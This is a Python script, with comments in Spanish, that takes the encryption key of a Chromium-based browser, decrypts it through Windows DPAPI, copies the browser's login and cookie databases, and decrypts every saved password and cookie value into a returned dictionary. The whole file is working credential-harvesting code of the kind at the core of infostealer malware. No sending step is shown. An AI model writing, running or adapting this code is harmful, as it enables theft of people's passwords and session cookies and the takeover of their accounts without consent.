import os
import json
import base64
import win32crypt
import shutil
import sqlite3
from datetime import datetime
from Crypto.Cipher import AES

def key_navegador(navegador: list):
    patch_key = os.path.join(os.path.expanduser('~'),"AppData", "Local", navegador[0], navegador[1],"User Data", "Local State")
    with open(patch_key, "r", encoding="utf-8") as f:
        file_key = f.read()
        json_key = json.loads(file_key)

    # decodifico, ya que está en base64
    key = base64.b64decode(json_key["os_crypt"]["encrypted_key"])[5:]

    #retorno llave desencriptada
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decript_data(data, key):
    try:
        # vector de inicializazcion para el cifrado
        iv = data[3:15]
        data = data[15:]
        # genero el cifrado con la llave
        cifrado = AES.new(key, AES.MODE_GCM, iv)
        # desencripto contrasenia
        return cifrado.decrypt(data)[:-16].decode()
    except:
        try:
            #si falla intento desencriptarla con win32crypt
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # no se pudo desencriptar, puede que haya estado vacio el campo, se retorna vacio
            return ""

def convert_date(i_time):
    if int(i_time) == 0:
        utc = datetime.utcfromtimestamp(0)
    else:
        fname = 116444736000000000
        nseconds = 10000000
        #
        utc = datetime.utcfromtimestamp(((10 * int(i_time)) - fname) / nseconds)
        #
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_data(navegador: list):
    #CONTRASEÑAS
    #llave de encriptacion
    key = key_navegador(navegador)
    #directorio de trabajo
    work_dir = os.path.expanduser('~')+f'\AppData\Local\{navegador[0]}\{navegador[1]}/User Data\Default'
    #traigo archivo login
    file_passwords = os.path.join(work_dir, "Login Data")
    # copio el archivo a mi lugar de ejecucion ya que se puede bloquear la bdd si el navegador la está usando
    shutil.copyfile(file_passwords, "dataLogin")

    database  = sqlite3.connect("dataLogin")
    db = database.cursor()

    contras = []

    db.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    for row in db.fetchall():
        contras.append({
            "url":row[0],
            "user":row[1],
            "password":decript_data(row[2],key),
            "created": convert_date(row[3]),
            "used": convert_date(row[4]),
        })

    db.close()
    database.close()

    #COOKIES
    file_cookies = os.path.join(work_dir, "Network", "Cookies")

    try:
        #intento copiar el archivo
        shutil.copyfile(file_cookies, "dataCookies")
    except:
        pass    

    database = sqlite3.connect("dataCookies")
    db = database.cursor()

    cookies = []

    db.execute("SELECT host_key, name, value, creation_utc, encrypted_value FROM cookies")

    for row in db.fetchall():
        cookies.append({
           "url":row[0],
           "nombre":row[1],
           "creacion":convert_date(row[3]),
           "valor": row[2] if row[2] else decript_data(row[4], key)
        })

    db.close()
    database.close()

    return {"cookies":cookies, "contras":contras}
